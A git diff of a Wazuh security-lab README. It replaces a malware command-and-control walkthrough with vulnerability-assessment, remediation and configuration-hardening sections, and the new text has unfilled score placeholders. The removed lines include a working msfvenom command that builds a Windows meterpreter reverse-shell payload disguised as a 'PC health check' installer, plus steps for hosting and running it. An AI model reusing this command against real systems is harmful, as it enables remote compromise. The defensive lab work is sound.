@@ -156,28 +156,54 @@
 
 ---
 
-## 4.Real-Time Malware Detection and Forensic Analysis
+## 4.Vulnerability Detection
 
-### 4.1.Full Attack Chain: Command and Control (C2)
+### 4.1.Vulnerability Assessment Report
 
-* Creating a malware uisng msfvenom `sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.251.3 LPORT=4444 --platform windows -a x64 -f exe -o WindowsPCHealthCheckSetup.msi.exe`.
+* The vulnerability scan performed by the Wazuh Cyber Threat Intelligence (CTI) module identified a critical risk level on the target machine. The system is currently exposed to a vast attack surface due to outdated operating system components and browser software.
 
-* Hosted it on `/var/www/html/WindowsPCHealthCheckSetup.msi.exe` in kali.
+![win](./screenshots/wazuh10.png)
 
-* _Windows defender real time protection is turned off for this lab demonstration._
+* The vulnerability assessment of DESKTOP-PBJ85VH revealed a high-risk security posture with 17 Critical vulnerabilities. The primary attack vector identified is an outdated Windows 10 build (19045.3803) and an obsolete version of Microsoft Edge.
 
-* Downloading the malware from `http://192.168.251.3/WindowsPCHealthCheckSetup.msi.exe` and running it on windows to make the remote connecion for command and control.
+![win](./screenshots/wazuh11.png)
 
-* Meterpreter session opened in multi/handler.
+* **Remediation Plan:** A comprehensive Windows Update would resolve over 90% of these findings by patching the kernel and updating system-critical browser components. This demonstrates that 'Unpatched Software' was the primary reason the simulated malware was able to operate with such high privileges.
 
-* **Executing Privilege Escalation:** ``
+### 4.2.Remediation (The "Fix")
 
-* Deleting/Moving the malware deep inside the system ``
+* **OS Patching:** Execute a full Windows Update to move the build from 19045 to the latest 2026 security baseline. This will resolve approximately 12 of the 17 Critical CVEs.
 
-* **Setting Persistence:** ``
+* **Application Lifecycle:** Manually update or reinstall Microsoft Edge to version 130+
 
-* Stealing/Damaging the data.
+ ![win](./screenshots/wazuh12.png)
 
-### 4.2.Post-Exploitation Analysis: Privilege Escalation and Detecting C2 Persistence
+* [**Before report**](./report/events-2026-03-03T02_45_31.573Z.csv)
 
+* [**After report**](./report/)
+ 
+---
 
+## 5.Security Configuration Assessment
+
+### 5.1.SCA Report
+
+* The Security Configuration Assessment (SCA) of the target workstation returned a failing score of 27% against the CIS Microsoft Windows 10 Enterprise Benchmark. With 301 failed checks, the system is highly susceptible to credential theft and lateral movement. Key failures include non-compliance with password complexity and account lockout policies, directly violating ISO 27001 and GDPR security requirements.
+
+ ![win](./screenshots/wazuh13.png)
+
+### 5.2.SCA Score (Hardening)
+
+* Following the initial assessment which showed a baseline score of 27%, a targeted hardening phase was initiated. By manually addressing high-impact configuration failures, the system reached a passing score of [Insert New Score]%. This represents a total improvement of [New Score minus 27]% in the overall security posture of the Windows 10 endpoint.
+
+ ![win](./screenshots/wazuh14.png)
+
+* [**Before report**](./report/checks.csv)
+
+* [**After report**](./report/)
+
+* _Used the built-in instructions in Wazuh to find exactly what was wrong with the system's settings. By following the step-by-step guides, navigated into the Windows Local Security Policy and fixed the security gaps. This ensured the computer was locked down according to official industry standards (CIS), rather than just guessing which settings to change._
+
+[PS](./folder/powershell.txt)
+
+---
